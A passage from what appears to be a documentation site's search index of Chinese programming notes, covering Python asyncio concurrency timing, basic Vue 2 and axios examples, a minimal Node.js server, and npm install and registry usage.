\u8fd0\u884c\u7ed3\u679c\u7b26\u5408\u5f02\u5e38\u8bf7\u6c42\uff0c\u8017\u65f6\u753115\u79d2\u53d8\u6210\u4e863\u79d2\uff0c\u5373\u539f\u6765\u76841/5\uff0c\u5b9e\u73b0\u4e86\u5e76\u53d1\u8bbf\u95ee\u3002\u4ee3\u7801\u4e2d\u6211\u4eec\u4f7f\u7528\u4e86await\uff0c\u540e\u9762\u8ddf\u4e86get()\u65b9\u6cd5\uff0c\u5728\u6267\u884c\u8fd95\u4e2a\u534f\u7a0b\u7684\u65f6\u5019\uff0c\u5982\u679c\u9047\u5230await\uff0c\u5c31\u4f1a\u5c06\u5f53\u524d\u534f\u7a0b\u6302\u8d77\uff0c\u8f6c\u800c\u53bb\u6267\u884c\u5176\u4ed6\u7684\u534f\u7a0b\uff0c\u76f4\u5230\u5176\u4ed6\u7684\u534f\u7a0b\u4e5f\u6302\u8d77\u6216\u6267\u884c\u5b8c\u6bd5\uff0c\u518d\u8fdb\u884c\u4e0b\u4e00\u4e2a\u534f\u7a0b\u7684\u6267\u884c\u3002\u5f02\u6b65\u64cd\u4f5c\u7684\u4fbf\u6377\u4e4b\u5904\u662f\uff0c\u5f53\u9047\u5230\u963b\u585e\u5f0f\u64cd\u4f5c\u65f6\uff0c\u4efb\u52a1\u88ab\u6302\u8d77\uff0c\u7a0b\u5e8f\u63a5\u7740\u53bb\u6267\u884c\u5176\u4ed6\u7684\u4efb\u52a1\uff0c\u800c\u4e0d\u662f\u50bb\u50bb\u5730\u7b49\u7740\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5145\u5206\u5229\u7528CPU\u65f6\u95f4\uff0c\u800c\u4e0d\u5fc5\u628a\u65f6\u95f4\u6d6a\u8d39\u5728\u7b49\u5f85I/O\u4e0a\u3002\u5728\u53d1\u51fa\u7f51\u7edc\u8bf7\u6c42\u540e\u76843\u79d2\u5185\uff0cCPU\u90fd\u662f\u7a7a\u95f2\u7684\uff0c\u90a3\u4e48\u589e\u52a0\u534f\u7a0b\u4efb\u52a1\u7684\u6570\u91cf\uff0c\u6700\u7ec8\u7684\u8017\u65f6\u8fd8\u4f1a\u662f3\u79d2\u5417\uff1f\u7406\u8bba\u6765\u8bf4\u786e\u5b9e\u662f\u8fd9\u6837\u7684\uff0c\u4e0d\u8fc7\u6709\u4e00\u4e2a\u524d\u63d0\uff0c\u90a3\u5c31\u662f\u670d\u52a1\u5668\u5728\u540c\u4e00\u65f6\u523b\u63a5\u53d7\u65e0\u9650\u6b21\u8bf7\u6c42\u90fd\u80fd\u4fdd\u8bc1\u6b63\u5e38\u8fd4\u56de\u7ed3\u679c\uff0c\u4e5f\u5c31\u662f\u670d\u52a1\u5668\u65e0\u9650\u6297\u538b\uff0c\u53e6\u5916\u8fd8\u8981\u5ffd\u7565I/O\u4f20\u8f93\u65f6\u5ef6\u3002\u6211\u4eec\u53ef\u4ee5\u5c06\u4e0a\u8ff0\u7684\u4efb\u52a1\u6570\u6269\u592720\u500d\uff0c\u5982\u4e0b\uff1a tasks = [asyncio.ensure_future(request()) for _ in range(20)] \u6700\u7ec8\u7684\u8017\u65f6\u5982\u4e0b\uff1a \u8017\u65f6 3.0600500106811523 \u79d2 \u8fd0\u884c\u65f6\u95f4\u4e5f\u662f\u57283\u79d2\u5de6\u53f3\uff0c\u5f53\u7136\u591a\u51fa\u6765\u7684\u65f6\u95f4\u5c31\u662fI/O\u65f6\u5ef6\u4e86\u3002\u53ef\u89c1\uff0c\u4f7f\u7528\u4e86\u5f02\u6b65\u534f\u7a0b\u4e4b\u540e\uff0c\u51e0\u4e4e\u53ef\u4ee5\u5728\u76f8\u540c\u7684\u65f6\u95f4\u5185\u5b9e\u73b0\u6210\u767e\u4e0a\u5343\u500d\u6b21\u7684\u7f51\u7edc\u8bf7\u6c42\uff0c\u628a\u8fd9\u4e2a\u6280\u672f\u8fd0\u7528\u5728\u722c\u866b\u9879\u76ee\u4e2d\uff0c\u901f\u5ea6\u63d0\u5347\u53ef\u8c13\u662f\u975e\u5e38\u53ef\u89c2\u4e86\u3002","title":"\u5b9e\u7528\u6837\u4f8b\uff1a"},{"location":"programming_language/vue/VUE%E4%BD%BF%E7%94%A8axios%E5%8A%A0%E8%BD%BD%E6%9C%AC%E5%9C%B0json/","text":"VUE\u4f7f\u7528axios\u52a0\u8f7d\u672c\u5730json <!DOCTYPE html> <html lang=\"en\"> <head> <meta charset=\"UTF-8\"> <title>Title</title> </head> <body> <div id=\"example\"> <div> \u540d\u79f0:{{info.name}} </div> <div> \u5730\u5740:{{info.address.country}}-{{info.address.city}}-{{info.address.street}} </div> <div> \u94fe\u63a5:<a v-bind:href=\"info.url\" target=\"_blank\">{{info.url}}</a> </div> <ul> <li v-for=\"link in info.links\">{{link.name}}-{{link.url}}</li> </ul> </div> <!--<script type=\"text/javascript\" src=\"js/vue.js\"></script>--> <!--<script type=\"text/javascript\" src=\"js/axios.min.js\"></script>--> <script src=\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\"></script> <script src=\"https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js\"></script> <script type=\"text/javascript\"> var example = new Vue({ el: '#example', data() { return { info: { name: '', address: { country: '', city: '', street: '' }, links: [] } } }, mounted() { axios.get('data.json').then(response => this.info = response.data) } }) </script> </body> </html> \u540c\u7ea7\u76ee\u5f55\u6570\u636e\uff1adata.json { \"name\": \"\u767e\u5ea6\", \"url\": \"http://www.baidu.com\", \"page\": 66, \"isNonProfit\": true, \"address\": { \"street\": \"\u6d77\u5b9a\u533a\", \"city\": \"\u5317\u4eac\u5e02\", \"country\": \"\u4e2d\u56fd\" }, \"links\": [ { \"name\": \"Google\", \"url\": \"http://www.google.com\" }, { \"name\": \"Baidu\", \"url\": \"http://www.baidu.com\" }, { \"name\": \"Sougou\", \"url\": \"http://www.sougou.com\" } ] }","title":"VUE\u4f7f\u7528axios\u52a0\u8f7d\u672c\u5730json"},{"location":"programming_language/vue/VUE%E4%BD%BF%E7%94%A8for%E5%BE%AA%E7%8E%AF/","text":"VUE\u4f7f\u7528for\u5faa\u73af <!DOCTYPE html> <html> <head> <meta charset=\"utf-8\"> <title>Vue \u6d4b\u8bd5\u5b9e\u4f8b </title> <script src=\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\"></script> </head> <body> <div id=\"app\"> <ol> <li v-for=\"site in sites\"> {{ site.name }} </li> </ol> </div> <script> new Vue({ el: '#app', data: { sites: [ { name: 'Runoob' }, { name: 'Google' }, { name: 'Taobao' } ] } }) </script> </body> </html> \u5217\u8868\u6e32\u67d3 \u2014 Vue.js (vuejs.org)","title":"VUE\u4f7f\u7528for\u5faa\u73af"},{"location":"programming_language/vue/VUE%E4%BD%BF%E7%94%A8if/","text":"VUE\u4f7f\u7528if <!DOCTYPE html> <html> <head> <meta charset=\"utf-8\"> <title>Vue \u6d4b\u8bd5\u5b9e\u4f8b </title> <script src=\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\"></script> </head> <body> <div id=\"app\"> <div v-if=\"type === 'A'\"> A </div> <div v-else-if=\"type === 'B'\"> B </div> <div v-else-if=\"type === 'C'\"> C </div> <div v-else> Not A/B/C </div> </div> <script> new Vue({ el: '#app', data: { type: 'C' } }) </script> </body> </html> \u6761\u4ef6\u6e32\u67d3 \u2014 Vue.js (vuejs.org)","title":"VUE\u4f7f\u7528if"},{"location":"programming_language/vue/VUE%E4%BD%BF%E7%94%A8%E4%BA%8B%E4%BB%B6%E7%9B%91%E5%90%AC/","text":"VUE\u4f7f\u7528\u4e8b\u4ef6\u76d1\u542c <!DOCTYPE html> <html> <head> <meta charset=\"utf-8\"> <title>Vue \u6d4b\u8bd5\u5b9e\u4f8b - \u83dc\u9e1f\u6559\u7a0b(runoob.com)</title> <script src=\"https://cdn.staticfile.org/vue/2.2.2/vue.min.js\"></script> </head> <body> <div id=\"app\"> <button v-on:click=\"counter += 1\">\u589e\u52a0 1</button> <p>\u8fd9\u4e2a\u6309\u94ae\u88ab\u70b9\u51fb\u4e86 {{ counter }} \u6b21\u3002</p> </div> <script> new Vue({ el: '#app', data: { counter: 0 } }) </script> </body> </html> \u4e8b\u4ef6\u5904\u7406 \u2014 Vue.js (vuejs.org)","title":"VUE\u4f7f\u7528\u4e8b\u4ef6\u76d1\u542c"},{"location":"programming_language/vue/VUE%E6%96%B9%E6%B3%95%E5%92%8C%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7/","text":"VUE\u65b9\u6cd5\u548c\u8ba1\u7b97\u5c5e\u6027 \u8ba1\u7b97\u5c5e\u6027 <!DOCTYPE html> <html> <head> <title>My first Vue app</title> <script src=\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\"></script> </head> <body> <div id=\"app\"> {{ message.split('').reverse().join('') }} </div> <script> var app = new Vue({ el: '#app', data: { message: 'Hello Vue!' } }) </script> </body> </html> \u65b9\u6cd5\u548c\u8ba1\u7b97\u5c5e\u6027 <!DOCTYPE html> <html lang=\"en\"> <head> <meta charset=\"UTF-8\"> <title>Title</title> </head> <body> <div id=\"app\"> <p>\u5f53\u524d\u65f6\u95f4\u65b9\u6cd5:{{getCurrentTime()}}</p> <p>\u5f53\u524d\u65f6\u95f4\u5c5e\u6027:{{getCurrentTime1}}</p> </div> <script type=\"text/javascript\" src=\"js/vue.js\"></script> <script type=\"text/javascript\"> var app = new Vue({ el:\"#app\", methods:{ getCurrentTime:function(){ return Date.now(); } }, computed:{ getCurrentTime1:function(){ return Date.now(); } } }) </script> </body> </html> \u8ba1\u7b97\u5c5e\u6027\u4e2d\u7684\u503c\u53ea\u8ba1\u7b97\u4e00\u6b21","title":"VUE\u65b9\u6cd5\u548c\u8ba1\u7b97\u5c5e\u6027"},{"location":"programming_language/vue/VUE%E8%BE%93%E5%85%A5%E7%BB%91%E5%AE%9A/","text":"VUE\u8f93\u5165\u7ed1\u5b9a <!DOCTYPE html> <html> <head> <title>My first Vue app</title> <script src=\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\"></script> </head> <body> <div id=\"app\"> <input v-model=\"message\" placeholder=\"edit me\"> <p> meaasge is : {{ message }} </p> <div id=\"example-5\"> <select v-model=\"selected\"> <option disabled value=\"\">\u8bf7\u4f60\u9009\u62e9</option> <option>A</option> <option>B</option> <option>C</option> </select> <span>Selected: {{ selected }}</span> </div> </div> <script> var app = new Vue({ el: '#app', data: { message: 'Hello Vue!', selected: '' } }) </script> </body> </html>","title":"VUE\u8f93\u5165\u7ed1\u5b9a"},{"location":"programming_language/vue/html%E4%B8%AD%E5%8A%A0%E8%BD%BDVUE/","text":"\u5728HTML\u4e2d\u52a0\u8f7dVUE \u521b\u5efa\u4e00\u4e2a .html \u6587\u4ef6\uff0c\u7136\u540e\u901a\u8fc7\u5982\u4e0b\u65b9\u5f0f\u5f15\u5165 Vue\uff1a <!-- \u5f00\u53d1\u73af\u5883\u7248\u672c\uff0c\u5305\u542b\u4e86\u6709\u5e2e\u52a9\u7684\u547d\u4ee4\u884c\u8b66\u544a --> <script src=\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\"></script> \u6216\u8005\uff1a <!-- \u751f\u4ea7\u73af\u5883\u7248\u672c\uff0c\u4f18\u5316\u4e86\u5c3a\u5bf8\u548c\u901f\u5ea6 --> <script src=\"https://cdn.jsdelivr.net/npm/vue@2\"></script> Demo\uff1a Hello.html <!DOCTYPE html> <html> <head> <title>My first Vue app</title> <script src=\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\"></script> </head> <body> <div id=\"app\"> {{ message }} </div> <script> var app = new Vue({ el: '#app', data: { message: 'Hello Vue!' } }) </script> </body> </html> \u6d4f\u89c8\u5668\u6253\u5f00\uff1a HTML\u6807\u7b7e\u67e5\u8be2 HTML \u6807\u7b7e\u53c2\u8003\u624b\u518c (w3school.com.cn) CSS\u5c5e\u6027\u67e5\u8be2 CSS \u53c2\u8003\u624b\u518c | \u83dc\u9e1f\u6559\u7a0b (runoob.com) Javascript\u67e5\u8be2 JavaScript \u6559\u7a0b (w3school.com.cn) \u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u4e2d\u4e0b\u8f7dVue.js devtools\u63d2\u4ef6 \u8fd9\u6837\u5c31\u53ef\u4ee5\u5728\u63a7\u5236\u53f0\u4e0a\u5bf9VUE\u8fdb\u884c\u8c03\u8bd5","title":"html\u4e2d\u52a0\u8f7dVUE"},{"location":"programming_language/vue/html%E4%B8%AD%E5%8A%A0%E8%BD%BDVUE/#htmlvue","text":"\u521b\u5efa\u4e00\u4e2a .html \u6587\u4ef6\uff0c\u7136\u540e\u901a\u8fc7\u5982\u4e0b\u65b9\u5f0f\u5f15\u5165 Vue\uff1a <!-- \u5f00\u53d1\u73af\u5883\u7248\u672c\uff0c\u5305\u542b\u4e86\u6709\u5e2e\u52a9\u7684\u547d\u4ee4\u884c\u8b66\u544a --> <script src=\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\"></script> \u6216\u8005\uff1a <!-- \u751f\u4ea7\u73af\u5883\u7248\u672c\uff0c\u4f18\u5316\u4e86\u5c3a\u5bf8\u548c\u901f\u5ea6 --> <script src=\"https://cdn.jsdelivr.net/npm/vue@2\"></script> Demo\uff1a Hello.html <!DOCTYPE html> <html> <head> <title>My first Vue app</title> <script src=\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\"></script> </head> <body> <div id=\"app\"> {{ message }} </div> <script> var app = new Vue({ el: '#app', data: { message: 'Hello Vue!' } }) </script> </body> </html> \u6d4f\u89c8\u5668\u6253\u5f00\uff1a HTML\u6807\u7b7e\u67e5\u8be2 HTML \u6807\u7b7e\u53c2\u8003\u624b\u518c (w3school.com.cn) CSS\u5c5e\u6027\u67e5\u8be2 CSS \u53c2\u8003\u624b\u518c | \u83dc\u9e1f\u6559\u7a0b (runoob.com) Javascript\u67e5\u8be2 JavaScript \u6559\u7a0b (w3school.com.cn) \u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u4e2d\u4e0b\u8f7dVue.js devtools\u63d2\u4ef6 \u8fd9\u6837\u5c31\u53ef\u4ee5\u5728\u63a7\u5236\u53f0\u4e0a\u5bf9VUE\u8fdb\u884c\u8c03\u8bd5","title":"\u5728HTML\u4e2d\u52a0\u8f7dVUE"},{"location":"programming_language/vue/nodejs%E8%BF%90%E8%A1%8C%E7%BD%91%E7%AB%99/","text":"node.js\u8fd0\u884c\u670d\u52a1\u5668\u7684\u4f8b\u5b50 \u521b\u5efa\u6587\u4ef6 server.js var http = require('http'); http.createServer(function (request, response) { // \u53d1\u9001 HTTP \u5934\u90e8 // HTTP \u72b6\u6001\u503c: 200 : OK // \u5185\u5bb9\u7c7b\u578b: text/plain response.writeHead(200, {'Content-Type': 'text/plain'}); // \u53d1\u9001\u54cd\u5e94\u6570\u636e \"Hello World\" response.end('Hello World\\n'); }).listen(8888); // \u7ec8\u7aef\u6253\u5370\u5982\u4e0b\u4fe1\u606f console.log('Server running at http://127.0.0.1:8888/'); \u8fd0\u884c ~ % node server.js Server running at http://127.0.0.1:8888/ \u8bbf\u95ee","title":"nodejs\u8fd0\u884c\u7f51\u7ad9"},{"location":"programming_language/vue/nodejs%E8%BF%90%E8%A1%8C%E7%BD%91%E7%AB%99/#nodejs","text":"\u521b\u5efa\u6587\u4ef6 server.js var http = require('http'); http.createServer(function (request, response) { // \u53d1\u9001 HTTP \u5934\u90e8 // HTTP \u72b6\u6001\u503c: 200 : OK // \u5185\u5bb9\u7c7b\u578b: text/plain response.writeHead(200, {'Content-Type': 'text/plain'}); // \u53d1\u9001\u54cd\u5e94\u6570\u636e \"Hello World\" response.end('Hello World\\n'); }).listen(8888); // \u7ec8\u7aef\u6253\u5370\u5982\u4e0b\u4fe1\u606f console.log('Server running at http://127.0.0.1:8888/'); \u8fd0\u884c ~ % node server.js Server running at http://127.0.0.1:8888/ \u8bbf\u95ee","title":"node.js\u8fd0\u884c\u670d\u52a1\u5668\u7684\u4f8b\u5b50"},{"location":"programming_language/vue/npm%E7%9A%84%E4%BD%BF%E7%94%A8/","text":"npm\u7684\u4f7f\u7528 NPM\u662f\u968f\u540cNodeJS\u4e00\u8d77\u5b89\u88c5\u7684\u5305\u7ba1\u7406\u5de5\u5177\uff0c\u80fd\u89e3\u51b3NodeJS\u4ee3\u7801\u90e8\u7f72\u4e0a\u7684\u5f88\u591a\u95ee\u9898\uff0c\u5e38\u89c1\u7684\u4f7f\u7528\u573a\u666f\u6709\u4ee5\u4e0b\u51e0\u79cd\uff1a \u5141\u8bb8\u7528\u6237\u4eceNPM\u670d\u52a1\u5668\u4e0b\u8f7d\u522b\u4eba\u7f16\u5199\u7684\u7b2c\u4e09\u65b9\u5305\u5230\u672c\u5730\u4f7f\u7528\u3002 \u5141\u8bb8\u7528\u6237\u4eceNPM\u670d\u52a1\u5668\u4e0b\u8f7d\u5e76\u5b89\u88c5\u522b\u4eba\u7f16\u5199\u7684\u547d\u4ee4\u884c\u7a0b\u5e8f\u5230\u672c\u5730\u4f7f\u7528\u3002 \u5141\u8bb8\u7528\u6237\u5c06\u81ea\u5df1\u7f16\u5199\u7684\u5305\u6216\u547d\u4ee4\u884c\u7a0b\u5e8f\u4e0a\u4f20\u5230NPM\u670d\u52a1\u5668\u4f9b\u522b\u4eba\u4f7f\u7528\u3002 \u7531\u4e8e\u65b0\u7248\u7684nodejs\u5df2\u7ecf\u96c6\u6210\u4e86npm\uff0c\u6240\u4ee5\u4e4b\u524dnpm\u4e5f\u4e00\u5e76\u5b89\u88c5\u597d\u4e86\u3002\u540c\u6837\u53ef\u4ee5\u901a\u8fc7\u8f93\u5165 \"npm -v\" \u6765\u6d4b\u8bd5\u662f\u5426\u6210\u529f\u5b89\u88c5\u3002\u547d\u4ee4\u5982\u4e0b\uff0c\u51fa\u73b0\u7248\u672c\u63d0\u793a\u8868\u793a\u5b89\u88c5\u6210\u529f % npm -v 8.11.0 \u4f7f\u7528 npm \u547d\u4ee4\u5b89\u88c5\u6a21\u5757 npm \u5b89\u88c5 Node.js \u6a21\u5757\u8bed\u6cd5\u683c\u5f0f\u5982\u4e0b\uff1a $ npm install <Module Name> \u5168\u5c40\u5b89\u88c5\u4e0e\u672c\u5730\u5b89\u88c5 npm \u7684\u5305\u5b89\u88c5\u5206\u4e3a\u672c\u5730\u5b89\u88c5\uff08local\uff09\u3001\u5168\u5c40\u5b89\u88c5\uff08global\uff09\u4e24\u79cd\uff0c\u4ece\u6572\u7684\u547d\u4ee4\u884c\u6765\u770b\uff0c\u5dee\u522b\u53ea\u662f\u6709\u6ca1\u6709-g\u800c\u5df2\uff08MAC\u7cfb\u7edf -g\u9700\u8981\u547d\u4ee4\u524dsudo\uff09\uff0c\u6bd4\u5982 npm install express # \u672c\u5730\u5b89\u88c5 sudo npm install express -g # \u5168\u5c40\u5b89\u88c5 \u5982\u679c\u51fa\u73b0\u4ee5\u4e0b\u9519\u8bef\uff1a npm err! Error: connect ECONNREFUSED 127.0.0.1:8087 \u89e3\u51b3\u529e\u6cd5\u4e3a\uff1a $ npm config set proxy null \u672c\u5730\u5b89\u88c5 \u5c06\u5b89\u88c5\u5305\u653e\u5728 ./node_modules \u4e0b\uff08\u8fd0\u884c npm \u547d\u4ee4\u65f6\u6240\u5728\u7684\u76ee\u5f55\uff09\uff0c\u5982\u679c\u6ca1\u6709 node_modules \u76ee\u5f55\uff0c\u4f1a\u5728\u5f53\u524d\u6267\u884c npm \u547d\u4ee4\u7684\u76ee\u5f55\u4e0b\u751f\u6210 node_modules \u76ee\u5f55\u3002 \u53ef\u4ee5\u901a\u8fc7 require() \u6765\u5f15\u5165\u672c\u5730\u5b89\u88c5\u7684\u5305\u3002 \u5168\u5c40\u5b89\u88c5 \u5c06\u5b89\u88c5\u5305\u653e\u5728 /usr/local \u4e0b\u6216\u8005\u4f60 node \u7684\u5b89\u88c5\u76ee\u5f55\u3002 \u53ef\u4ee5\u76f4\u63a5\u5728\u547d\u4ee4\u884c\u91cc\u4f7f\u7528\u3002 \u5982\u679c\u4f60\u5e0c\u671b\u5177\u5907\u4e24\u8005\u529f\u80fd\uff0c\u5219\u9700\u8981\u5728\u4e24\u4e2a\u5730\u65b9\u5b89\u88c5\u5b83\u6216\u4f7f\u7528 npm link \u3002 \u67e5\u770b\u5b89\u88c5\u4fe1\u606f \u4f60\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u6765\u67e5\u770b\u6240\u6709\u5168\u5c40\u5b89\u88c5\u7684\u6a21\u5757\uff1a $ npm list -g \u251c\u2500\u252c cnpm@4.3.2 \u2502 \u251c\u2500\u2500 auto-correct@1.0.0 \u2502 \u251c\u2500\u2500 bagpipe@0.3.5 \u2502 \u251c\u2500\u2500 colors@1.1.2 \u2502 \u251c\u2500\u252c commander@2.9.0 \u2502 \u2502 \u2514\u2500\u2500 graceful-readlink@1.0.1 \u2502 \u251c\u2500\u252c cross-spawn@0.2.9 \u2502 \u2502 \u2514\u2500\u2500 lru-cache@2.7.3 \u2026\u2026 \u5982\u679c\u8981\u67e5\u770b\u67d0\u4e2a\u6a21\u5757\u7684\u7248\u672c\u53f7\uff0c\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\u5982\u4e0b\uff1a $ npm list grunt projectName@projectVersion /path/to/project/folder \u2514\u2500\u2500 grunt@0.4.1 \u5378\u8f7d\u6a21\u5757 \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u6765\u5378\u8f7d Node.js \u6a21\u5757\u3002 $ npm uninstall express \u5378\u8f7d\u540e\uff0c\u5982\u679c\u5168\u5c40\u5b89\u88c5\u7684\uff0c\u4f60\u53ef\u4ee5\u5230 /node_modules/ \uff08MAC\u5728 /usr/local/lib/node_modules/ \u4e0b\uff09\u76ee\u5f55\u4e0b\u67e5\u770b\u5305\u662f\u5426\u8fd8\u5b58\u5728\uff0c\u6216\u8005\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u67e5\u770b\uff0c\u5982\u679c\u662f\u672c\u5730\u5b89\u88c5\uff0c\u76f4\u63a5\u5728\u5b89\u88c5\u76ee\u5f55\u8fdb\u884c\u67e5\u770b\uff1a $ npm ls \u66f4\u65b0\u6a21\u5757 \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u66f4\u65b0\u6a21\u5757\uff1a $ npm update express \u641c\u7d22\u6a21\u5757 \u4f7f\u7528\u4ee5\u4e0b\u6765\u641c\u7d22\u6a21\u5757\uff1a $ npm search express \u4f7f\u7528\u6dd8\u5b9d NPM \u955c\u50cf \u5927\u5bb6\u90fd\u77e5\u9053\u56fd\u5185\u76f4\u63a5\u4f7f\u7528 npm \u7684\u5b98\u65b9\u955c\u50cf\u662f\u975e\u5e38\u6162\u7684\uff0c\u8fd9\u91cc\u63a8\u8350\u4f7f\u7528\u6dd8\u5b9d NPM \u955c\u50cf\u3002 \u6dd8\u5b9d NPM \u955c\u50cf\u662f\u4e00\u4e2a\u5b8c\u6574 npmjs.org \u955c\u50cf\uff0c\u4f60\u53ef\u4ee5\u7528\u6b64\u4ee3\u66ff\u5b98\u65b9\u7248\u672c(\u53ea\u8bfb)\uff0c\u540c\u6b65\u9891\u7387\u76ee\u524d\u4e3a 10\u5206\u949f \u4e00\u6b21\u4ee5\u4fdd\u8bc1\u5c3d\u91cf\u4e0e\u5b98\u65b9\u670d\u52a1\u540c\u6b65\u3002 \u4f60\u53ef\u4ee5\u4f7f\u7528\u6dd8\u5b9d\u5b9a\u5236\u7684 cnpm (gzip \u538b\u7f29\u652f\u6301) \u547d\u4ee4\u884c\u5de5\u5177\u4ee3\u66ff\u9ed8\u8ba4\u7684 npm: $ sudo npm install -g cnpm --registry=https://registry.npmmirror.com \u8fd9\u6837\u5c31\u53ef\u4ee5\u4f7f\u7528 cnpm \u547d\u4ee4\u6765\u5b89\u88c5\u6a21\u5757\u4e86\uff1a $ cnpm install [name] npm\u66f4\u6362\u955c\u50cf\u6e90 \u67e5\u770b\u539f\u6765\u7684\u6e90 $ npm config get registry https://registry.npmjs.org/ \u66f4\u6362\u56fd\u5185\u7684\u6e90 npm config set registry https://registry.npm.taobao.org \u5b89\u88c5\u4ece\u6307\u5b9a\u7684\u6e90 npm install --registry=https://registry.npm.taobao.org npm install \u4e0e npm i \u533a\u522b\u5982\u4e0b\uff1a npm i \u5b89\u88c5\u7684\u6a21\u5757\u53ca\u4f9d\u8d56\uff0c\u4f7f\u7528 npm uninstall \u662f\u6ca1\u6709\u529e\u6cd5\u5220\u9664\u7684\uff0c\u5fc5\u987b\u4f7f\u7528 npm uninstall i \u624d\u53ef\u4ee5\u5220\u9664 npm i \u4f1a\u5e2e\u52a9\u68c0\u6d4b\u4e0e\u5f53\u524d node \u6700\u5339\u914d\u7684 npm \u7684\u7248\u672c\u53f7\uff0c\u5e76\u5339\u914d\u51fa\u76f8\u4e92\u4f9d\u8d56\u7684 npm \u5305\u5e94\u8be5\u5347\u7ea7\u7684\u7248\u672c\u53f7 npm i \u5b89\u88c5\u7684\u4e00\u4e9b\u5305\uff0c\u5728\u5f53\u524d\u7684 node \u7248\u672c\u4e0b\u662f\u6ca1\u6709\u529e\u6cd5\u4f7f\u7528\u7684\uff0c\u5fc5\u987b\u4f7f\u7528\u5efa\u8bae\u7248\u672c npm i \u5b89\u88c5\u51fa\u73b0\u95ee\u9898\u662f\u4e0d\u4f1a\u51fa\u73b0 npm-debug.log \u6587\u4ef6\u7684\uff0c\u4f46 npm install \u5b89\u88c5\u51fa\u73b0\u95ee\u9898\u662f\u6709\u8fd9\u4e2a\u6587\u4ef6\u7684 npm i XXX_name -S = > npm install XXX_name --save \u5199\u5165\u5230 dependencies \u5bf9\u8c61 npm i XXX_name -D => npm install XXX_name --save-dev \u5199\u5165\u5230 devDependencies \u5bf9\u8c61 npm i XXX_name -g \u5168\u5c40\u5b89\u88c5 i \u662f install \u7684\u7b80\u5199 -S \u5c31\u662f --save \u7684\u7b80\u5199 -D \u5c31\u662f --save-dev \u8fd9\u6837\u5b89\u88c5\u7684\u5305\u7684\u540d\u79f0\u53ca\u7248\u672c\u53f7\u5c31\u4f1a\u5b58\u5728 package.json \u7684 devDependencies \u8fd9\u4e2a\u91cc\u9762\uff0c\u800c --save \u4f1a\u5c06\u5305\u7684\u540d\u79f0\u53ca\u7248\u672c\u53f7\u653e\u5728dependencies\u91cc\u9762\u3002 \u6211\u4eec\u5728\u4f7f\u7528 npm install \u5b89\u88c5\u6a21\u5757\u6216\u63d2\u4ef6\u7684\u65f6\u5019\uff0c\u6709\u4e24\u79cd\u547d\u4ee4\u628a\u4ed6\u4eec\u5199\u5165\u5230 package.json \u6587\u4ef6\u91cc\u9762\u53bb\uff0c\u6bd4\u5982\uff1a --save --save-dev ** \u5728 package.json \u6587\u4ef6\u91cc\u9762\u63d0\u73b0\u51fa\u6765\u7684\u533a\u522b: --save \u5b89\u88c5\u7684\u63d2\u4ef6\uff0c\u88ab\u5199\u5165\u5230 dependencies \u5bf9\u8c61\u91cc\u9762\u53bb\u3002 --save-dev \u5b89\u88c5\u7684\u63d2\u4ef6\uff0c\u88ab\u5199\u5165\u5230 devDependencies \u5bf9\u8c61\u91cc\u9762\u53bb\u3002 package.json \u6587\u4ef6\u91cc\u9762\u7684 devDependencies \u548c dependencies \u5bf9\u8c61\u6709\u4ec0\u4e48\u533a\u522b\u5462\uff1f devDependencies \u91cc\u9762\u7684\u63d2\u4ef6\u53ea\u7528\u4e8e\u5f00\u53d1\u73af\u5883\uff0c\u4e0d\u7528\u4e8e\u751f\u4ea7\u73af\u5883\u3002 dependencies \u662f\u9700\u8981\u53d1\u5e03\u5230\u751f\u4ea7\u73af\u5883\u7684\u3002","title":"npm\u7684\u4f7f\u7528"},{"location":"programming_language/vue/npm%E7%9A%84%E4%BD%BF%E7%94%A8/#npm","text":"NPM\u662f\u968f\u540cNodeJS\u4e00\u8d77\u5b89\u88c5\u7684\u5305\u7ba1\u7406\u5de5\u5177\uff0c\u80fd\u89e3\u51b3NodeJS\u4ee3\u7801\u90e8\u7f72\u4e0a\u7684\u5f88\u591a\u95ee\u9898\uff0c\u5e38\u89c1\u7684\u4f7f\u7528\u573a\u666f\u6709\u4ee5\u4e0b\u51e0\u79cd\uff1a \u5141\u8bb8\u7528\u6237\u4eceNPM\u670d\u52a1\u5668\u4e0b\u8f7d\u522b\u4eba\u7f16\u5199\u7684\u7b2c\u4e09\u65b9\u5305\u5230\u672c\u5730\u4f7f\u7528\u3002 \u5141\u8bb8\u7528\u6237\u4eceNPM\u670d\u52a1\u5668\u4e0b\u8f7d\u5e76\u5b89\u88c5\u522b\u4eba\u7f16\u5199\u7684\u547d\u4ee4\u884c\u7a0b\u5e8f\u5230\u672c\u5730\u4f7f\u7528\u3002 \u5141\u8bb8\u7528\u6237\u5c06\u81ea\u5df1\u7f16\u5199\u7684\u5305\u6216\u547d\u4ee4\u884c\u7a0b\u5e8f\u4e0a\u4f20\u5230NPM\u670d\u52a1\u5668\u4f9b\u522b\u4eba\u4f7f\u7528\u3002 \u7531\u4e8e\u65b0\u7248\u7684nodejs\u5df2\u7ecf\u96c6\u6210\u4e86npm\uff0c\u6240\u4ee5\u4e4b\u524dnpm\u4e5f\u4e00\u5e76\u5b89\u88c5\u597d\u4e86\u3002\u540c\u6837\u53ef\u4ee5\u901a\u8fc7\u8f93\u5165 \"npm -v\" 